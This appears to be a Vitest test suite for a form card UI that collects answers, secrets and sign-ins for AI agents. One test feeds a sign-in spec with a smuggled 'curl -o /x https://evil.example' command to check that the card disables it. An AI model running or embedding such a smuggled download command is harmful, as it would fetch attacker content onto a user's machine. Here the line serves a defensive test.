// @vitest-environment jsdom
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { setProvider } from '../../data';
import type { FormOutcome, FormSpec, FormsSource } from '../../data';
import { createMockProvider } from '../../data/mock-provider';
import { createCard } from './index';
import type { HxCard } from './index';
import { useFormsHost } from './forms-host';

class FakeForms implements FormsSource {
  submitted: { id: string; outcome: FormOutcome }[] = [];
  cancelled: string[] = [];
  fail: string | null = null;
  can = { signin: true, upload: true, folder: false };
  submit(id: string, outcome: FormOutcome): Promise<void> {
    if (this.fail) return Promise.reject(new Error(this.fail));
    this.submitted.push({ id, outcome: { values: { ...outcome.values }, secrets: { ...outcome.secrets } } });
    return Promise.resolve();
  }
  cancel(id: string): Promise<void> { this.cancelled.push(id); return Promise.resolve(); }
  signin(): Promise<void> { return Promise.resolve(); }
  pickerItems(): never[] { return []; }
  pickFolder(): Promise<string | null> { return Promise.resolve(null); }
}

const spec = (props: Record<string, unknown>, required: string[] = [], extra: Partial<FormSpec> = {}): FormSpec => ({ id: 'f' + Math.random().toString(36).slice(2, 7), kind: 'question', title: 'A question', schema: { properties: props as never, required }, ...extra });
const mount = (s: FormSpec, o: { size?: 'inline' | 'compact' | 'mini'; state?: string } = {}): HxCard => { const c = createCard('form', s as never, { size: o.size ?? 'inline', ...(o.state ? { state: o.state } : {}) }); document.body.append(c); return c; };
const tick = (): Promise<void> => new Promise((r) => setTimeout(r, 0));
const press = (el: Element, key: string, init: KeyboardEventInit = {}): KeyboardEvent => { const e = new KeyboardEvent('keydown', { key, code: init.code ?? (key.length === 1 ? 'Key' + key.toUpperCase() : key), bubbles: true, cancelable: true, ...init }); el.dispatchEvent(e); return e; };

let host: FakeForms;
beforeAll(() => { setProvider(createMockProvider({ simulate: false })); });
beforeEach(() => { vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockReturnValue(null); host = new FakeForms(); useFormsHost(host); document.body.replaceChildren(); });
afterEach(() => { useFormsHost(null); });

describe('every field type', () => {
  it('draws strings, numbers, formats and long text as labelled inputs with their limits', () => {
    const c = mount(spec({ s: { type: 'string', title: 'Name' }, n: { type: 'integer', title: 'Minutes', minimum: 1, maximum: 60 }, e: { type: 'string', format: 'email', title: 'Mail' }, u: { type: 'string', format: 'uri', title: 'Site' }, t: { type: 'string', title: 'Notes', 'x-multiline': true } }, ['s']));
    const input = (n: string): HTMLInputElement => c.querySelector(`[data-name="${n}"]`) as HTMLInputElement;
    expect(input('s').type).toBe('text');
    expect(input('s').getAttribute('aria-required')).toBe('true');
    expect(input('n').type).toBe('number');
    expect([input('n').min, input('n').max, input('n').step]).toEqual(['1', '60', '1']);
    expect(input('e').type).toBe('email');
    expect(input('u').type).toBe('url');
    expect(c.querySelector('textarea[data-name="t"]')).toBeTruthy();
    expect(c.querySelector('label[for="' + input('s').id + '"]')?.textContent).toContain('Name');
    expect(c.querySelector('[data-field="t"] .cd-opt-label')?.textContent).toBe('(optional)');
    expect(c.querySelector('[data-field="s"] .cd-opt-label')).toBeNull();
  });
  it('draws a boolean as a switch with its hint, in a label', () => {
    const c = mount(spec({ b: { type: 'boolean', title: 'Network', description: 'Off keeps it hermetic.', default: true } }));
    const sw = c.querySelector<HTMLInputElement>('input[role="switch"]');
    expect(sw?.checked).toBe(true);
    expect(c.textContent).toContain('Off keeps it hermetic.');
  });
  it('draws an enum as a radio group of numbered options and names them by enumNames', () => {
    const c = mount(spec({ r: { type: 'string', title: 'Rule', enum: ['a', 'b'], enumNames: ['Alpha', 'Beta'] } }, ['r']));
    const g = c.querySelector('[role="radiogroup"]');
    expect(g?.getAttribute('aria-labelledby')).toBeTruthy();
    const rows = [...c.querySelectorAll<HTMLElement>('.cd-opt')];
    expect(rows.map((r) => r.textContent?.replace(/\d$/, ''))).toEqual(['Alpha', 'Beta']);
    expect(rows.map((r) => r.getAttribute('aria-keyshortcuts'))).toEqual(['1', '2']);
    expect(rows.map((r) => r.tabIndex)).toEqual([0, -1]);
  });
  it('draws multi as checkboxes and "other" as a free text option', () => {
    const c = mount(spec({ m: { type: 'string', enum: ['a', 'b'], 'x-multi': true, 'x-other': true, title: 'Many' } }));
    expect(c.querySelector('[role="group"].cd-opts')).toBeTruthy();
    expect([...c.querySelectorAll('.cd-opt')].every((r) => r.getAttribute('role') === 'checkbox')).toBe(true);
    expect(c.querySelector('.cd-free input')?.getAttribute('placeholder')).toBe('Other');
    expect(c.querySelector('.cd-free .ui-sr')?.textContent).toContain('Other');
  });
  it('shows the preview of the focused or chosen option beside the options', () => {
    const c = mount(spec({ r: { type: 'string', enum: ['a', 'b'], 'x-preview': [{ code: 'one' }, { text: 'two', note: 'n' }] } }));
    const pv = c.querySelector('.cd-preview') as HTMLElement;
    expect(pv.textContent).toContain('Pick an answer');
    (c.querySelectorAll('.cd-opt')[1] as HTMLElement).click();
    expect(pv.textContent).toContain('two');
    expect(pv.textContent).toContain('n');
    expect(pv.getAttribute('aria-live')).toBe('polite');
  });
  it('draws a secret as a password field with a Paste button, never with a value', () => {
    const c = mount(spec({ k: { type: 'string', title: 'Key', 'x-secret': true, 'x-secret-ref': 'secret://provider.x/api_key' } }, ['k'], { kind: 'credential' }));
    const i = c.querySelector<HTMLInputElement>('input[data-secret]');
    expect(i?.type).toBe('password');
    expect(i?.getAttribute('autocomplete')).toBe('off');
    expect(i?.hasAttribute('value')).toBe(false);
    expect(c.querySelector('[data-action="paste"]')?.getAttribute('aria-label')).toContain('Key');
  });
  it('disables a sign-in that carries a command, or names a provider the host does not know, and says so; a known one shows the line the host runs', () => {
    (host as { login?: unknown }).login = (s: { provider?: string; command?: string; args?: unknown }) => (s.command !== undefined || s.args !== undefined ? { known: false } : s.provider === 'gcloud' ? { known: true, line: 'gcloud auth login --brief' } : { known: false });
    const btn = (c: HxCard): HTMLButtonElement | null => c.querySelector<HTMLButtonElement>('[data-action="signin"]');
    const note = (c: HxCard): string => c.querySelector('.cd-note')?.textContent ?? '';
    const withCommand = mount(spec({ l: { 'x-signin': { provider: 'gcloud', command: 'curl', args: ['-o', '/x', 'https://evil.example'] } } }, ['l'], { kind: 'signin' }));
    expect(btn(withCommand)?.disabled).toBe(true);
    expect(note(withCommand)).toBe('This sign-in is not one boopis knows.');
    const unknown = mount(spec({ l: { 'x-signin': { provider: 'curl' } } }, ['l'], { kind: 'signin' }));
    expect(btn(unknown)?.disabled).toBe(true);
    expect(note(unknown)).toBe('This sign-in is not one boopis knows.');
    const known = mount(spec({ l: { 'x-signin': { provider: 'gcloud' } } }, ['l'], { kind: 'signin' }));
    expect(btn(known)?.disabled).toBe(false);
    expect(note(known)).toBe('Runs gcloud auth login --brief on this computer, then shows what it said.');
    const server = mount(spec({ l: { 'x-signin': { provider: 'Linear', server: 'linear', host: 'linear.app' } } }, ['l'], { kind: 'signin' }));
    expect(btn(server)?.disabled).toBe(false);
    expect(note(server)).toBe('Opens linear.app in your browser.');
  });
  it('tells the host when a running sign-in is cancelled, and goes back to open so it can be tried again', async () => {
    const stopped: string[] = [];
    let release: () => void = () => undefined;
    host.signin = () => new Promise<void>((r) => { release = r; });
    (host as { cancelSignin?: (id: string, field: string) => Promise<void> }).cancelSignin = (id, field) => { stopped.push(id + ':' + field); return Promise.resolve(); };
    const s = spec({ l: { 'x-signin': { provider: 'Linear', server: 'linear' } } }, ['l'], { kind: 'signin', id: 'sign1' });
    const c = mount(s);
    c.querySelector<HTMLElement>('[data-action="signin"]')?.click();
    await tick();
    expect(c.getAttribute('data-state') ?? c.dataset['state']).toBe('submitting');
    c.querySelector<HTMLElement>('[data-action="cancel"]')?.click();
    await tick();
    expect(stopped).toEqual(['sign1:l']);
    release();
  });
  it('draws pickers, an upload drop and a sign-in, and disables the ones this build cannot run', () => {
    const s = spec({ p: { 'x-picker': 'model', title: 'Model', default: 'sonnet 5.5' }, f: { 'x-upload': true, title: 'Log' }, l: { 'x-signin': { provider: 'Linear', host: 'linear.app' } } });
    let c = mount(s);
    const pk = c.querySelector<HTMLElement>('.cd-picker');
    expect(pk?.getAttribute('aria-haspopup')).toBe('menu');
    expect(pk?.querySelector('svg.ui-mm[data-color="brand"]')).toBeTruthy();   /* the picker is the one place brand colour shows */
    expect(c.querySelector('.cd-drop')).toBeTruthy();
    expect(c.querySelector<HTMLButtonElement>('[data-action="signin"]')?.disabled).toBe(false);
    host.can = { signin: false, upload: false, folder: false };
    c = mount(s);
    expect(c.querySelector<HTMLButtonElement>('[data-action="signin"]')?.disabled).toBe(true);
    expect(c.textContent).toContain('not available in this build yet');
  });
  it('shows a config diff, a plan and a connector\'s contents before the fields', () => {
    const c = mount(spec({}, [], { diff: ' a: 1\n+b: 2\n-c: 3', file: 'x.yaml', plan: ['Do `a`', 'Do b'], contents: [['5 tools', 'issues']], pinned: 'sha256:abc' }));
    expect(c.querySelector('.cd-diff')?.getAttribute('aria-label')).toBe('Changes to x.yaml');
    expect(c.querySelector('.cd-diff [data-d="add"] .ui-sr')?.textContent).toBe('added: ');
    expect(c.querySelector('.cd-diff [data-d="del"] .ui-sr')?.textContent).toBe('removed: ');
    expect(c.querySelectorAll('.cd-plan li')).toHaveLength(2);
    expect(c.querySelector('.cd-pinned')?.textContent).toContain('sha256:abc');
  });
});

describe('every state', () => {
  const s = (): FormSpec => spec({ a: { type: 'string', title: 'A' } }, ['a'], { origin: { kind: 'agent', model: 'sonnet 5.5' }, title: 'Add the thing', expires: 'expires in 9 min' });
  it('open: the fields, Later, Cancel, the submit, the countdown and the stamp', () => {
    const c = mount(s());
    expect(c.state).toBe('open');
    expect(['defer', 'cancel', 'submit'].every((a) => c.querySelector(`[data-action="${a}"]`))).toBe(true);
    expect(c.querySelector('[data-countdown]')).toBeTruthy();
    expect(c.querySelector('[data-stamp]')?.textContent).toBe('waiting for you');
    expect(c.getAttribute('aria-labelledby')).toBeTruthy();
  });
  it('invalid: the error sits in the field description, the field is invalid, the card says what to check', () => {
    const c = mount(s());
    c.querySelector<HTMLElement>('[data-action="submit"]')?.click();
    expect(c.state).toBe('invalid');
    const i = c.querySelector<HTMLInputElement>('[data-name="a"]') as HTMLInputElement;
    const e = c.querySelector<HTMLElement>('.cd-err') as HTMLElement;
    expect(e.hidden).toBe(false);
    expect(e.textContent).toBe('Enter a');
    expect(i.getAttribute('aria-invalid')).toBe('true');
    expect(i.getAttribute('aria-describedby')).toContain(e.id);
    i.value = 'x'; i.dispatchEvent(new Event('input'));
    expect(c.state).toBe('open');
    expect(e.hidden).toBe(true);
    expect(i.hasAttribute('aria-invalid')).toBe(false);
  });
  it('submitting, done, deferred, expired and cancelled each say what happened and what can happen next', async () => {
    const c = mount(s());
    c.querySelector<HTMLInputElement>('[data-name="a"]')!.value = 'v';
    c.querySelector<HTMLInputElement>('[data-name="a"]')!.dispatchEvent(new Event('input'));
    c.querySelector<HTMLElement>('[data-action="submit"]')?.click();
    expect(c.state).toBe('submitting');
    expect(c.getAttribute('aria-busy')).toBe('true');
    expect(c.textContent).toContain('Sending your answer');
    await tick();
    expect(c.state).toBe('done');
    expect(c.textContent).toContain('Answered: v');
    expect(c.hasAttribute('data-resolved')).toBe(true);
    expect(c.querySelector('form')).toBeNull();
    expect(host.submitted).toHaveLength(1);

    const d = mount(s(), { state: 'deferred' });
    expect(d.textContent).toContain('Later. It waits in the dock');
    expect(d.querySelector('[data-action="reopen"]')?.textContent).toBe('Open');
    const x = mount(s(), { state: 'expired' });
    expect(x.textContent).toContain('Expired, nothing was saved');
    expect(x.querySelector('[data-action="reopen"]')?.textContent).toBe('Ask again');
    const k = mount(s(), { state: 'cancelled' });
    expect(k.textContent).toContain('Sonnet 5.5 continues without it');
  });
  it('opens again from deferred and from expired, and asks the asker again when it lapsed', () => {
    const c = mount(s(), { state: 'deferred' });
    c.querySelector<HTMLElement>('[data-action="reopen"]')?.click();
    expect(c.state).toBe('open');
    expect(c.querySelector('form')).toBeTruthy();
  });
  it('a form the provider reports as answered elsewhere starts as a receipt', () => {
    expect(mount({ ...s(), resolved: 'submitted' }).state).toBe('done');
    expect(mount({ ...s(), resolved: 'cancelled' }).state).toBe('cancelled');
    expect(mount({ ...s(), resolved: 'expired' }).state).toBe('expired');
  });
  it('one row: the origin\'s mark, the title and a short status', () => {
    const c = mount(s(), { size: 'mini' });
    expect(c.querySelector('.cd-mini__lead svg.ui-mm')).toBeTruthy();
    expect(c.querySelector('.cd-mini__who')?.textContent).toContain('sonnet 5.5');
    expect(c.querySelector('.cd-mini__dot .ui-dot')).toBeTruthy();
    expect(c.querySelector('.cd-mini__status [data-countdown]')).toBeTruthy();
  });
});

describe('the answer', () => {
  it('sends the values and the secret to the provider alone, and tells the event only that a secret was provided', async () => {
    const c = mount(spec({ k: { type: 'string', title: 'Key', 'x-secret': true, 'x-secret-ref': 'secret://p.q/k' }, note: { type: 'string', title: 'Note' } }, ['k'], { kind: 'credential' }));
    const seen: unknown[] = [];
    c.addEventListener('hx:card-action', (e) => { seen.push((e as CustomEvent).detail.value); });
    const key = c.querySelector<HTMLInputElement>('input[data-secret]') as HTMLInputElement;
    key.value = 'sk-very-secret'; key.dispatchEvent(new Event('input'));
    const note = c.querySelector<HTMLInputElement>('[data-name="note"]') as HTMLInputElement;
    note.value = 'hi'; note.dispatchEvent(new Event('input'));
    c.querySelector<HTMLElement>('[data-action="submit"]')?.click();
    expect(key.value).toBe('');
    expect(document.body.innerHTML).not.toContain('sk-very-secret');
    await tick();
    expect(host.submitted[0]?.outcome).toEqual({ values: { note: 'hi' }, secrets: { k: 'sk-very-secret' } });
    expect(JSON.stringify(seen)).not.toContain('sk-very-secret');
    expect(seen[0]).toMatchObject({ values: { note: 'hi' }, provided: ['k'] });
    expect(JSON.stringify(c.formState)).not.toContain('sk-very-secret');
    expect(c.state).toBe('done');
    expect(c.textContent).toContain('Saved to your keychain');
  });
  it('reopens with what went wrong when the answer was not delivered, and asks for the secret again', async () => {
    host.fail = 'The key could not be saved to your keychain.';
    const c = mount(spec({ k: { type: 'string', title: 'Key', 'x-secret': true } }, ['k'], { kind: 'credential' }));
    const key = c.querySelector<HTMLInputElement>('input[data-secret]') as HTMLInputElement;
    key.value = 'sk-x'; key.dispatchEvent(new Event('input'));
    c.querySelector<HTMLElement>('[data-action="submit"]')?.click();
    await tick();
    expect(c.state).toBe('open');
    expect(c.querySelector('[role="alert"]')?.textContent).toContain('could not be saved');
    expect(c.querySelector<HTMLInputElement>('input[data-secret]')?.value).toBe('');
    expect(document.body.innerHTML).not.toContain('sk-x');
  });
  it('cancel tells the provider and the receipt says the asker goes on without it', async () => {
    const c = mount(spec({ a: { type: 'string' } }, [], { origin: { kind: 'plugin' } }));
    c.querySelector<HTMLElement>('[data-action="cancel"]')?.click();
    await tick();
    expect(c.state).toBe('cancelled');
    expect(host.cancelled).toEqual([c.data.id]);
    expect(c.textContent).toContain('Governance continues without it');
  });
  it('asks for the hold before an approval goes (it does not submit on a plain click of the hold)', () => {
    const c = mount(spec({}, [], { kind: 'approval' }));
    expect(c.querySelector('[data-hold]')).toBeTruthy();
    expect(c.querySelector('[data-action="submit"]')).toBeNull();
    expect(c.querySelector('[data-action="cancel"]')?.textContent).toContain('Deny');
  });
  it('one id, one answer: a second card for the same form takes the receipt', async () => {
    const s0 = spec({ a: { type: 'string' } }, [], { title: 'Same form' });
    const a = mount(s0), b = mount(s0);
    a.querySelector<HTMLElement>('[data-action="submit"]')?.click();
    await tick();
    expect(a.state).toBe('done');
    expect(b.state).toBe('done');
    expect(b.querySelector('form')).toBeNull();
  });
});

describe('the keyboard', () => {
  it('Esc defers and never cancels; a form with nowhere to wait ignores it', () => {
    const c = mount(spec({ a: { type: 'string' } }));
    const input = c.querySelector('[data-name="a"]') as HTMLElement;
    const e = press(input, 'Escape');
    expect(e.defaultPrevented).toBe(true);
    expect(c.state).toBe('deferred');
    expect(host.cancelled).toEqual([]);
    const n = mount(spec({ a: { type: 'string' } }, [], { defer: false }));
    expect(n.querySelector('[data-action="defer"]')).toBeNull();
    press(n.querySelector('[data-name="a"]') as HTMLElement, 'Escape');
    expect(n.state).toBe('open');
  });
  it('Enter in a field submits; Enter in long text does not (mod+Enter does)', async () => {
    const c = mount(spec({ a: { type: 'string', 'x-multiline': true } }));
    const ta = c.querySelector('textarea') as HTMLElement;
    press(ta, 'Enter');
    expect(c.state).toBe('open');
    press(ta, 'Enter', { ctrlKey: true });
    await tick();
    expect(host.submitted).toHaveLength(1);
  });
  it('x cancels and 1-9 pick an option when focus is not in a text field, and not while typing', () => {
    const c = mount(spec({ r: { type: 'string', enum: ['a', 'b'] }, t: { type: 'string' } }));
    const opt = c.querySelector('.cd-opt') as HTMLElement;
    press(opt, '2', { code: 'Digit2' });
    expect(c.querySelector('.cd-opt:nth-child(2)')?.getAttribute('aria-checked')).toBe('true');
    const text = c.querySelector('[data-name="t"]') as HTMLElement;
    press(text, 'x', { code: 'KeyX' });
    expect(c.state).not.toBe('cancelled');
    press(opt, 'x', { code: 'KeyX' });
    expect(c.state).toBe('cancelled');
  });
  it('arrow keys move through and choose in a radio group', () => {
    const c = mount(spec({ r: { type: 'string', enum: ['a', 'b', 'c'] } }));
    const rows = [...c.querySelectorAll<HTMLElement>('.cd-opt')];
    rows[0]?.focus();
    press(rows[0] as HTMLElement, 'ArrowDown');
    expect(rows[1]?.getAttribute('aria-checked')).toBe('true');
    expect(document.activeElement).toBe(rows[1]);
  });
  it('picks several in a multi group and keeps them in the answer', async () => {
    const c = mount(spec({ m: { type: 'string', enum: ['a', 'b', 'c'], 'x-multi': true } }, ['m']));
    const rows = [...c.querySelectorAll<HTMLElement>('.cd-opt')];
    rows[0]?.click(); rows[2]?.click();
    c.querySelector<HTMLElement>('[data-action="submit"]')?.click();
    await tick();
    expect(host.submitted[0]?.outcome.values).toEqual({ m: ['a', 'c'] });
  });
});

describe('the dock row timing', () => {
  it('shows a form\'s countdown from its expiry and expires it when the time comes', () => {
    vi.useFakeTimers();
    try {
      const c = mount(spec({ a: { type: 'string' } }, [], { expiresAt: Date.now() + 3000 }));
      vi.advanceTimersByTime(1000);
      expect(c.querySelector('[data-countdown]')?.textContent).toMatch(/Expires in \d s/);
      vi.advanceTimersByTime(3000);
      expect(c.state).toBe('expired');
    } finally { vi.useRealTimers(); }
  });
});
